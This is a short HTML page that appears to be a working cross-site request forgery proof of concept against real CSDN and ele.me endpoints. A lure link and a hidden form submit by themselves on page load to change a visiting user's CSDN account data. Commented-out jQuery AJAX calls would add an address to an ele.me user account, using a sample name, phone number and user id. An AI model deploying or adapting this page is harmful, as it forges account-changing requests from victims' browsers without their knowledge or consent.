hello world!
<a href="http://my.csdn.net/service/main/do_add_knownarea?areaname=${hi}">点我有惊喜！</a>


<form action=http://my.csdn.net/service/main/do_add_knownarea method=GET>
    <input type="hidden" name="areaname" value="${hi}">
</form>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script>
     document.forms[0].submit();
    /*$.ajax({
        url: 'http://ele.me/restapi/v1/users/18354231/addresses',
        //url: '/',
        contentType: 'application/json;charset=UTF-8',
        type: 'GET',
        data: JSON.stringify({
            "userId":18354231,"name":"lulu","phone":"15923432345","address_detail":"s","address":"澳洲广场","geohash":"wtw3fufg7h1","poi_type":0
        })
    });
    $.ajax({
        url: 'http://my.csdn.net/service/main/do_add_knownarea?areaname=',
        //url: '/',
        contentType: 'application/json;charset=UTF-8',
        type: 'GET',
        data: JSON.stringify({
            "userId":18354231,"name":"lulu","phone":"15923432345","address_detail":"s","address":"澳洲广场","geohash":"wtw3fufg7h1","poi_type":0
        })
*/
</script>
